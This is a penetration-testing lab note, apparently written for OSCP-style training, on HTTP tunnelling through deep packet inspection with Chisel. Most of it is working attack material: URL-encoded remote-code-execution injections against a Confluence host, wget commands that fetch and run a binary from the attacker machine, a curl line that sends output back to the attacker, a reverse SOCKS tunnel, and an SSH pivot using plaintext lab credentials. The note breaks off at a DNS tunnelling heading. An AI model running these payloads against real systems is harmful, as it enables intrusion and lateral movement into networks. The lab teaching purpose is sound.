
Deep Packet Inspection (DPI) *aka* packet sniffing
- Method of examining the content of data packets as they pass by a checkpoint on the network


# HTTP Tunneling
##### Scenario:
- Have compromised CONFLUENCE01, and can execute commands via HTTP requests.
- Blocked by a considerably restrictive network configuration when trying to pivot.
- DPI is terminating all outbound traffic except HTTP
- All inbound ports on CONFLUENCE01 are blocked except TCP/8090


- Can't rely on a normal reverse shell as it would not conform to the HTTP format and would be terminated at the network perimeter by the DPI solution.
- Can't create an SSH remote port forward for the same reason.
- Only traffic that will reach our Kali machine is HTTP
	- Can, for example, make requests with _Wget_ and _cURL_.

- FIREWALL/INSPECTOR device has replaced the previous simple firewall.
- MULTISERVER03 is blocked on the WAN interface.
- Have credentials for the PGDATABASE01 server
- Need to figure out how to SSH directly there through CONFLUENCE01.
- Need a tunnel into the internal network
- Must resemble an outgoing HTTP connection from CONFLUENCE01.
- CONFLUENCE01 is Linux based (allowing us to use **chisel**)

##### Execution:
![](http-tunnel.png)
- Run [Chisel](Tools.md#chisel) server on Kali
- Accept a connection from a Chisel client running on CONFLUENCE01
- Chisel will bind a SOCKS proxy port on the Kali machine.
	- With `--reverse` options set
- The Chisel server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted.
- The Chisel client will then decapsulate it and push it wherever it is addressed.

> The traffic between the Chisel client and server is all HTTP-formatted. This means we can traverse the deep packet inspection solution regardless of the contents of each HTTP packet. The Chisel server on our Kali machine will listen on TCP port 1080, a SOCKS proxy port. All traffic sent to that port will be passed back up the HTTP tunnel to the Chisel client, where it will be forwarded wherever it's addressed.

- CONFLUENCE01 - **192.168.239.63**
- PGDATABASE01 - **10.4.239.215**   `database_admin / sqlpass123`


- Copy chisel over to CONFLUENCE01
```bash
sudo cp $(which chisel) .

python3 -m http.server 80
```

- Craft CONFLUENCE01 injectable payload to download chisel and set as an executable
```bash
wget 192.168.45.166/chisel -O /tmp/chisel && chmod +x /tmp/chisel
```

- Submit payload via a a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

- Set up Reverse Port Forward Server on Kali
```bash
chisel server --port 8080 --reverse
	2024/06/24 21:16:49 server: Reverse tunnelling enabled
	2024/06/24 21:16:49 server: Fingerprint eqnhO59Dz8gJ4de6b2Kvvnbv1X/QhAPgs8v4PsyBhck=
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
```

- Log incoming traffic
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
	[sudo] password for kali:
	tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

- Craft an injectable payload which also redirects stdout and stderr to a file, sending it back to our Kali for debugging needs
```bash
/tmp/chisel client 192.168.45.166:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.166:8080/
```

- Start the Chisel client, applying the server address and the port forwarding configuration options via a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.166:8080/%27%29.start%28%29%22%29%7D/
```

- View data in **tcpdump** for any error messages
```bash
	...
	/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32` not found (required by /tmp/chisel)/tmp/chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34` not found (required by /tmp/chisel)
	...
```
	- Points towards a version incompatibility.
	- Chisel is expecting to use glibc version 2.32 or 2.34, neither of which can be found on CONFLUENCE01.

> When a version of a tool or component is more recent than the operating system it's trying to run on, there's a risk that the operating system will not contain the required technologies that the newer tool is expecting to be able to use

- Check **chisel** version
```bash
chisel -h

  Usage: chisel [command] [--help]

  Version: 1.9.1-0kali1 (go1.21.3)
```
	- Chisel version 1.9.1
	- Written in Go version 1.21.3

> Googling reveals that similar messages appear when binaries compiled with Go versions 1.20 and later are run on operating systems that don't have a compatible version of **glibc**.

As the version which introduces this error is 1.20, we'll need to look for versions of **chisel** that are written with a previous version of Go.
Looking through the official github's releases, there's a 1.8.1 version that uses Go 1.9

- Replace with compatible version
```bash
# Download v1.8.1 (working in ~/exercises/forward_tunnel dir)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
	...
	chisel_1.8.1_linux_amd64.gz            100%[============================================================================>]   3.33M  --.-KB/s    in 0.1s
	...

# Remove newer chisel
rm chisel

# Unzip v1.8.1
gunzip chisel_1.8.1_linux_amd64.gz

# Rename
mv chisel_1.8.1_linux_amd64 chisel

# Make executable
chmod +x chisel

# Server
python3 -m http.server 80
```

- Resubmit v1.8.1 chisel to CONFLUENCE01, store in /tmp/, and make executable
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
```

- Resubmit injectable payload, redirecting stdout and stderr to a file for debugging, starting the client, and applying the server address and the port forwarding configuration options via a URL encoded **curl** injection
```bash
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.166:8080/%27%29.start%28%29%22%29%7D/
```

If all goes well, you should see the connection back in tcpdump, the terminal w/ the chisel server running, and ss output
```bash
# Tcpdump Output
	...
	GET / HTTP/1.1
        Host: 192.168.45.166:8080
        User-Agent: Go-http-client/1.1
        Connection: Upgrade
        Sec-WebSocket-Key: 1XYYBchie98k37jAyB+/PQ==
        Sec-WebSocket-Protocol: chisel-v3
        Sec-WebSocket-Version: 13
        Upgrade: websocket
		...


# Terminal w/ chisel server
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
	2024/06/24 21:52:47 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
	2024/06/24 21:52:47 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening


# ss Output
ss -ntlpu
	Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process
	udp         UNCONN       0            0                     0.0.0.0:49038                    0.0.0.0:*
	tcp         LISTEN       0            4096                127.0.0.1:1080                     0.0.0.0:*           users:(("chisel",pid=8598,fd=8))
	tcp         LISTEN       0            4096                        *:8080                           *:*           users:(("chisel",pid=8598,fd=6))
```
	- SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine

###### proxychains

- Edit conf file
```bash
sudo vim /etc/proxychains4.conf
	socks5 127.0.0.1 1080
```

- SSH in to PGDATABASE01
```bash
proxychains ssh database_admin@10.4.239.215
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.239.215:22  ...  OK
	...
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.4.239.215' (ED25519) to the list of known hosts.
	database_admin@10.4.239.215''s password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
	...
	Last login: Thu Feb 16 21:49:42 2023 from 10.4.50.63
	database_admin@pgdatabase01:~$


cat /tmp/chisel_flag 
	OS{ceff330a45bf0b99e00bdc5fe6c28aa2}
```



# DNS Tunneling

##### Scenario: